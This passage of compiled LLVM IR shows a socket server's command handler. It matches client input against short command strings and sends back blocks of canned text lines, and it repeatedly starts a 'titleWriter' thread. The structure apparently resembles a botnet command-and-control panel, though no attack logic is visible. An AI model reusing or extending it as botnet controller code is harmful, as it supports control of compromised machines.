; <label>:351:                                    ; preds = %347
  %352 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %353 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %354 = call i64 @strlen(i8* nonnull %97) #9
  %355 = call i64 @send(i32 %93, i8* nonnull %97, i64 %354, i32 16384) #10
  %356 = icmp eq i64 %355, -1
  br i1 %356, label %.loopexit.loopexit, label %.backedge

; <label>:357:                                    ; preds = %304
  %358 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.48, i64 0, i64 0)) #9
  %359 = icmp eq i8* %358, null
  br i1 %359, label %360, label %369

; <label>:360:                                    ; preds = %357
  %361 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.49, i64 0, i64 0)) #9
  %362 = icmp eq i8* %361, null
  br i1 %362, label %363, label %369

; <label>:363:                                    ; preds = %360
  %364 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.50, i64 0, i64 0)) #9
  %365 = icmp eq i8* %364, null
  br i1 %365, label %366, label %369

; <label>:366:                                    ; preds = %363
  %367 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i64 0, i64 0)) #9
  %368 = icmp eq i8* %367, null
  br i1 %368, label %403, label %369

; <label>:369:                                    ; preds = %366, %363, %360, %357
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %213, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.52, i64 0, i64 0), i64 72, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %214, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %215, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.53, i64 0, i64 0), i64 58, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %216, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.54, i64 0, i64 0), i64 58, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %217, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.55, i64 0, i64 0), i64 60, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %218, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.56, i64 0, i64 0), i64 55, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %219, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  %370 = call i64 @strlen(i8* nonnull %213) #9
  %371 = call i64 @send(i32 %93, i8* nonnull %213, i64 %370, i32 16384) #10
  %372 = icmp eq i64 %371, -1
  br i1 %372, label %.loopexit.loopexit, label %373

; <label>:373:                                    ; preds = %369
  %374 = call i64 @strlen(i8* nonnull %214) #9
  %375 = call i64 @send(i32 %93, i8* nonnull %214, i64 %374, i32 16384) #10
  %376 = icmp eq i64 %375, -1
  br i1 %376, label %.loopexit.loopexit, label %377

; <label>:377:                                    ; preds = %373
  %378 = call i64 @strlen(i8* nonnull %215) #9
  %379 = call i64 @send(i32 %93, i8* nonnull %215, i64 %378, i32 16384) #10
  %380 = icmp eq i64 %379, -1
  br i1 %380, label %.loopexit.loopexit, label %381

; <label>:381:                                    ; preds = %377
  %382 = call i64 @strlen(i8* nonnull %216) #9
  %383 = call i64 @send(i32 %93, i8* nonnull %216, i64 %382, i32 16384) #10
  %384 = icmp eq i64 %383, -1
  br i1 %384, label %.loopexit.loopexit, label %385

; <label>:385:                                    ; preds = %381
  %386 = call i64 @strlen(i8* nonnull %217) #9
  %387 = call i64 @send(i32 %93, i8* nonnull %217, i64 %386, i32 16384) #10
  %388 = icmp eq i64 %387, -1
  br i1 %388, label %.loopexit.loopexit, label %389

; <label>:389:                                    ; preds = %385
  %390 = call i64 @strlen(i8* nonnull %218) #9
  %391 = call i64 @send(i32 %93, i8* nonnull %218, i64 %390, i32 16384) #10
  %392 = icmp eq i64 %391, -1
  br i1 %392, label %.loopexit.loopexit, label %393

; <label>:393:                                    ; preds = %389
  %394 = call i64 @strlen(i8* nonnull %219) #9
  %395 = call i64 @send(i32 %93, i8* nonnull %219, i64 %394, i32 16384) #10
  %396 = icmp eq i64 %395, -1
  br i1 %396, label %.loopexit.loopexit, label %397

; <label>:397:                                    ; preds = %393
  %398 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %399 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %400 = call i64 @strlen(i8* nonnull %97) #9
  %401 = call i64 @send(i32 %93, i8* nonnull %97, i64 %400, i32 16384) #10
  %402 = icmp eq i64 %401, -1
  br i1 %402, label %.loopexit.loopexit, label %.backedge

; <label>:403:                                    ; preds = %366
  %404 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.57, i64 0, i64 0)) #9
  %405 = icmp eq i8* %404, null
  br i1 %405, label %406, label %415

; <label>:406:                                    ; preds = %403
  %407 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0)) #9
  %408 = icmp eq i8* %407, null
  br i1 %408, label %409, label %415

; <label>:409:                                    ; preds = %406
  %410 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i64 0, i64 0)) #9
  %411 = icmp eq i8* %410, null
  br i1 %411, label %412, label %415

; <label>:412:                                    ; preds = %409
  %413 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.60, i64 0, i64 0)) #9
  %414 = icmp eq i8* %413, null
  br i1 %414, label %454, label %415

; <label>:415:                                    ; preds = %412, %409, %406, %403
  %416 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %205, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.61, i64 0, i64 0), i64 76, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %206, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %207, i8* getelementptr inbounds ([114 x i8], [114 x i8]* @.str.62, i64 0, i64 0), i64 114, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %208, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.63, i64 0, i64 0), i64 107, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %209, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.64, i64 0, i64 0), i64 107, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %210, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.65, i64 0, i64 0), i64 107, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %211, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.66, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %212, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  %417 = call i64 @strlen(i8* nonnull %205) #9
  %418 = call i64 @send(i32 %93, i8* nonnull %205, i64 %417, i32 16384) #10
  %419 = icmp eq i64 %418, -1
  br i1 %419, label %.loopexit.loopexit, label %420

; <label>:420:                                    ; preds = %415
  %421 = call i64 @strlen(i8* nonnull %206) #9
  %422 = call i64 @send(i32 %93, i8* nonnull %206, i64 %421, i32 16384) #10
  %423 = icmp eq i64 %422, -1
  br i1 %423, label %.loopexit.loopexit, label %424

; <label>:424:                                    ; preds = %420
  %425 = call i64 @strlen(i8* nonnull %207) #9
  %426 = call i64 @send(i32 %93, i8* nonnull %207, i64 %425, i32 16384) #10
  %427 = icmp eq i64 %426, -1
  br i1 %427, label %.loopexit.loopexit, label %428

; <label>:428:                                    ; preds = %424
  %429 = call i64 @strlen(i8* nonnull %208) #9
  %430 = call i64 @send(i32 %93, i8* nonnull %208, i64 %429, i32 16384) #10
  %431 = icmp eq i64 %430, -1
  br i1 %431, label %.loopexit.loopexit, label %432

; <label>:432:                                    ; preds = %428
  %433 = call i64 @strlen(i8* nonnull %209) #9
  %434 = call i64 @send(i32 %93, i8* nonnull %209, i64 %433, i32 16384) #10
  %435 = icmp eq i64 %434, -1
  br i1 %435, label %.loopexit.loopexit, label %436

; <label>:436:                                    ; preds = %432
  %437 = call i64 @strlen(i8* nonnull %210) #9
  %438 = call i64 @send(i32 %93, i8* nonnull %210, i64 %437, i32 16384) #10
  %439 = icmp eq i64 %438, -1
  br i1 %439, label %.loopexit.loopexit, label %440

; <label>:440:                                    ; preds = %436
  %441 = call i64 @strlen(i8* nonnull %211) #9
  %442 = call i64 @send(i32 %93, i8* nonnull %211, i64 %441, i32 16384) #10
  %443 = icmp eq i64 %442, -1
  br i1 %443, label %.loopexit.loopexit, label %444

; <label>:444:                                    ; preds = %440
  %445 = call i64 @strlen(i8* nonnull %212) #9
  %446 = call i64 @send(i32 %93, i8* nonnull %212, i64 %445, i32 16384) #10
  %447 = icmp eq i64 %446, -1
  br i1 %447, label %.loopexit.loopexit, label %448

; <label>:448:                                    ; preds = %444
  %449 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %450 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %451 = call i64 @strlen(i8* nonnull %97) #9
  %452 = call i64 @send(i32 %93, i8* nonnull %97, i64 %451, i32 16384) #10
  %453 = icmp eq i64 %452, -1
  br i1 %453, label %.loopexit.loopexit, label %.backedge

; <label>:454:                                    ; preds = %412
  %455 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #9
  %456 = icmp eq i8* %455, null
  br i1 %456, label %457, label %466

; <label>:457:                                    ; preds = %454
  %458 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.68, i64 0, i64 0)) #9
  %459 = icmp eq i8* %458, null
  br i1 %459, label %460, label %466

; <label>:460:                                    ; preds = %457
  %461 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i64 0, i64 0)) #9
  %462 = icmp eq i8* %461, null
  br i1 %462, label %463, label %466

; <label>:463:                                    ; preds = %460
  %464 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0)) #9
  %465 = icmp eq i8* %464, null
  br i1 %465, label %520, label %466

; <label>:466:                                    ; preds = %463, %460, %457, %454
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %193, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.71, i64 0, i64 0), i64 76, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %194, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %195, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.72, i64 0, i64 0), i64 119, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %196, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.73, i64 0, i64 0), i64 119, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %197, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.74, i64 0, i64 0), i64 119, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %198, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.75, i64 0, i64 0), i64 119, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %199, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.76, i64 0, i64 0), i64 119, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %200, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.77, i64 0, i64 0), i64 119, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %201, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.78, i64 0, i64 0), i64 119, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %202, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.79, i64 0, i64 0), i64 119, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %203, i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.80, i64 0, i64 0), i64 120, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %204, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  %467 = call i64 @strlen(i8* nonnull %193) #9
  %468 = call i64 @send(i32 %93, i8* nonnull %193, i64 %467, i32 16384) #10
  %469 = icmp eq i64 %468, -1
  br i1 %469, label %.loopexit.loopexit, label %470

; <label>:470:                                    ; preds = %466
  %471 = call i64 @strlen(i8* nonnull %194) #9
  %472 = call i64 @send(i32 %93, i8* nonnull %194, i64 %471, i32 16384) #10
  %473 = icmp eq i64 %472, -1
  br i1 %473, label %.loopexit.loopexit, label %474

; <label>:474:                                    ; preds = %470
  %475 = call i64 @strlen(i8* nonnull %195) #9
  %476 = call i64 @send(i32 %93, i8* nonnull %195, i64 %475, i32 16384) #10
  %477 = icmp eq i64 %476, -1
  br i1 %477, label %.loopexit.loopexit, label %478

; <label>:478:                                    ; preds = %474
  %479 = call i64 @strlen(i8* nonnull %196) #9
  %480 = call i64 @send(i32 %93, i8* nonnull %196, i64 %479, i32 16384) #10
  %481 = icmp eq i64 %480, -1
  br i1 %481, label %.loopexit.loopexit, label %482

; <label>:482:                                    ; preds = %478
  %483 = call i64 @strlen(i8* nonnull %197) #9
  %484 = call i64 @send(i32 %93, i8* nonnull %197, i64 %483, i32 16384) #10
  %485 = icmp eq i64 %484, -1
  br i1 %485, label %.loopexit.loopexit, label %486

; <label>:486:                                    ; preds = %482
  %487 = call i64 @strlen(i8* nonnull %198) #9
  %488 = call i64 @send(i32 %93, i8* nonnull %198, i64 %487, i32 16384) #10
  %489 = icmp eq i64 %488, -1
  br i1 %489, label %.loopexit.loopexit, label %490

; <label>:490:                                    ; preds = %486
  %491 = call i64 @strlen(i8* nonnull %199) #9
  %492 = call i64 @send(i32 %93, i8* nonnull %199, i64 %491, i32 16384) #10
  %493 = icmp eq i64 %492, -1
  br i1 %493, label %.loopexit.loopexit, label %494

; <label>:494:                                    ; preds = %490
  %495 = call i64 @strlen(i8* nonnull %200) #9
  %496 = call i64 @send(i32 %93, i8* nonnull %200, i64 %495, i32 16384) #10
  %497 = icmp eq i64 %496, -1
  br i1 %497, label %.loopexit.loopexit, label %498

; <label>:498:                                    ; preds = %494
  %499 = call i64 @strlen(i8* nonnull %201) #9
  %500 = call i64 @send(i32 %93, i8* nonnull %201, i64 %499, i32 16384) #10
  %501 = icmp eq i64 %500, -1
  br i1 %501, label %.loopexit.loopexit, label %502

; <label>:502:                                    ; preds = %498
  %503 = call i64 @strlen(i8* nonnull %202) #9
  %504 = call i64 @send(i32 %93, i8* nonnull %202, i64 %503, i32 16384) #10
  %505 = icmp eq i64 %504, -1
  br i1 %505, label %.loopexit.loopexit, label %506

; <label>:506:                                    ; preds = %502
  %507 = call i64 @strlen(i8* nonnull %203) #9
  %508 = call i64 @send(i32 %93, i8* nonnull %203, i64 %507, i32 16384) #10
  %509 = icmp eq i64 %508, -1
  br i1 %509, label %.loopexit.loopexit, label %510

; <label>:510:                                    ; preds = %506
  %511 = call i64 @strlen(i8* nonnull %204) #9
  %512 = call i64 @send(i32 %93, i8* nonnull %204, i64 %511, i32 16384) #10
  %513 = icmp eq i64 %512, -1
  br i1 %513, label %.loopexit.loopexit, label %514

; <label>:514:                                    ; preds = %510
  %515 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %516 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %517 = call i64 @strlen(i8* nonnull %97) #9
  %518 = call i64 @send(i32 %93, i8* nonnull %97, i64 %517, i32 16384) #10
  %519 = icmp eq i64 %518, -1
  br i1 %519, label %.loopexit.loopexit, label %.backedge

; <label>:520:                                    ; preds = %463
  %521 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.81, i64 0, i64 0)) #9
  %522 = icmp eq i8* %521, null
  br i1 %522, label %523, label %535

; <label>:523:                                    ; preds = %520
  %524 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.82, i64 0, i64 0)) #9
  %525 = icmp eq i8* %524, null
  br i1 %525, label %526, label %535

; <label>:526:                                    ; preds = %523
  %527 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.83, i64 0, i64 0)) #9
  %528 = icmp eq i8* %527, null
  br i1 %528, label %529, label %535

; <label>:529:                                    ; preds = %526
  %530 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i64 0, i64 0)) #9
  %531 = icmp eq i8* %530, null
  br i1 %531, label %532, label %535

; <label>:532:                                    ; preds = %529
  %533 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.85, i64 0, i64 0)) #9
  %534 = icmp eq i8* %533, null
  br i1 %534, label %562, label %535

; <label>:535:                                    ; preds = %532, %529, %526, %523, %520
  %536 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %188, i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.86, i64 0, i64 0), i64 79, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %189, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %190, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.87, i64 0, i64 0), i64 88, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %191, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.88, i64 0, i64 0), i64 88, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %192, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  %537 = call i64 @strlen(i8* nonnull %188) #9
  %538 = call i64 @send(i32 %93, i8* nonnull %188, i64 %537, i32 16384) #10
  %539 = icmp eq i64 %538, -1
  br i1 %539, label %.loopexit.loopexit, label %540

; <label>:540:                                    ; preds = %535
  %541 = call i64 @strlen(i8* nonnull %189) #9
  %542 = call i64 @send(i32 %93, i8* nonnull %189, i64 %541, i32 16384) #10
  %543 = icmp eq i64 %542, -1
  br i1 %543, label %.loopexit.loopexit, label %544

; <label>:544:                                    ; preds = %540
  %545 = call i64 @strlen(i8* nonnull %190) #9
  %546 = call i64 @send(i32 %93, i8* nonnull %190, i64 %545, i32 16384) #10
  %547 = icmp eq i64 %546, -1
  br i1 %547, label %.loopexit.loopexit, label %548

; <label>:548:                                    ; preds = %544
  %549 = call i64 @strlen(i8* nonnull %191) #9
  %550 = call i64 @send(i32 %93, i8* nonnull %191, i64 %549, i32 16384) #10
  %551 = icmp eq i64 %550, -1
  br i1 %551, label %.loopexit.loopexit, label %552

; <label>:552:                                    ; preds = %548
  %553 = call i64 @strlen(i8* nonnull %192) #9
  %554 = call i64 @send(i32 %93, i8* nonnull %192, i64 %553, i32 16384) #10
  %555 = icmp eq i64 %554, -1
  br i1 %555, label %.loopexit.loopexit, label %556

; <label>:556:                                    ; preds = %552
  %557 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %558 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %559 = call i64 @strlen(i8* nonnull %97) #9
  %560 = call i64 @send(i32 %93, i8* nonnull %97, i64 %559, i32 16384) #10
  %561 = icmp eq i64 %560, -1
  br i1 %561, label %.loopexit.loopexit, label %.backedge

; <label>:562:                                    ; preds = %532
  %563 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.89, i64 0, i64 0)) #9
  %564 = icmp eq i8* %563, null
  br i1 %564, label %565, label %571

; <label>:565:                                    ; preds = %562
  %566 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i64 0, i64 0)) #9
  %567 = icmp eq i8* %566, null
  br i1 %567, label %568, label %571

; <label>:568:                                    ; preds = %565
  %569 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.91, i64 0, i64 0)) #9
  %570 = icmp eq i8* %569, null
  br i1 %570, label %670, label %571

; <label>:571:                                    ; preds = %568, %565, %562
  %572 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %165, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.92, i64 0, i64 0), i64 73, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %166, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %167, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.93, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %168, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.94, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %169, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.95, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %170, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.96, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %171, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.97, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %172, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.98, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %173, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.99, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %174, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.100, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %175, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.101, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %176, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.102, i64 0, i64 0), i64 74, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %177, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %178, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.103, i64 0, i64 0), i64 41, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %179, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.104, i64 0, i64 0), i64 39, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %180, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.105, i64 0, i64 0), i64 40, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %181, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.106, i64 0, i64 0), i64 39, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %182, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.107, i64 0, i64 0), i64 42, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %183, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.108, i64 0, i64 0), i64 41, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %184, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.109, i64 0, i64 0), i64 43, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %185, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.110, i64 0, i64 0), i64 39, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %186, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.111, i64 0, i64 0), i64 44, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %187, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  %573 = call i64 @strlen(i8* nonnull %165) #9
  %574 = call i64 @send(i32 %93, i8* nonnull %165, i64 %573, i32 16384) #10
  %575 = icmp eq i64 %574, -1
  br i1 %575, label %.loopexit.loopexit, label %576

; <label>:576:                                    ; preds = %571
  %577 = call i64 @strlen(i8* nonnull %166) #9
  %578 = call i64 @send(i32 %93, i8* nonnull %166, i64 %577, i32 16384) #10
  %579 = icmp eq i64 %578, -1
  br i1 %579, label %.loopexit.loopexit, label %580

; <label>:580:                                    ; preds = %576
  %581 = call i64 @strlen(i8* nonnull %167) #9
  %582 = call i64 @send(i32 %93, i8* nonnull %167, i64 %581, i32 16384) #10
  %583 = icmp eq i64 %582, -1
  br i1 %583, label %.loopexit.loopexit, label %584

; <label>:584:                                    ; preds = %580
  %585 = call i64 @strlen(i8* nonnull %168) #9
  %586 = call i64 @send(i32 %93, i8* nonnull %168, i64 %585, i32 16384) #10
  %587 = icmp eq i64 %586, -1
  br i1 %587, label %.loopexit.loopexit, label %588

; <label>:588:                                    ; preds = %584
  %589 = call i64 @strlen(i8* nonnull %169) #9
  %590 = call i64 @send(i32 %93, i8* nonnull %169, i64 %589, i32 16384) #10
  %591 = icmp eq i64 %590, -1
  br i1 %591, label %.loopexit.loopexit, label %592

; <label>:592:                                    ; preds = %588
  %593 = call i64 @strlen(i8* nonnull %170) #9
  %594 = call i64 @send(i32 %93, i8* nonnull %170, i64 %593, i32 16384) #10
  %595 = icmp eq i64 %594, -1
  br i1 %595, label %.loopexit.loopexit, label %596

; <label>:596:                                    ; preds = %592
  %597 = call i64 @strlen(i8* nonnull %171) #9
  %598 = call i64 @send(i32 %93, i8* nonnull %171, i64 %597, i32 16384) #10
  %599 = icmp eq i64 %598, -1
  br i1 %599, label %.loopexit.loopexit, label %600

; <label>:600:                                    ; preds = %596
  %601 = call i64 @strlen(i8* nonnull %172) #9
  %602 = call i64 @send(i32 %93, i8* nonnull %172, i64 %601, i32 16384) #10
  %603 = icmp eq i64 %602, -1
  br i1 %603, label %.loopexit.loopexit, label %604

; <label>:604:                                    ; preds = %600
  %605 = call i64 @strlen(i8* nonnull %173) #9
  %606 = call i64 @send(i32 %93, i8* nonnull %173, i64 %605, i32 16384) #10
  %607 = icmp eq i64 %606, -1
  br i1 %607, label %.loopexit.loopexit, label %608

; <label>:608:                                    ; preds = %604
  %609 = call i64 @strlen(i8* nonnull %174) #9
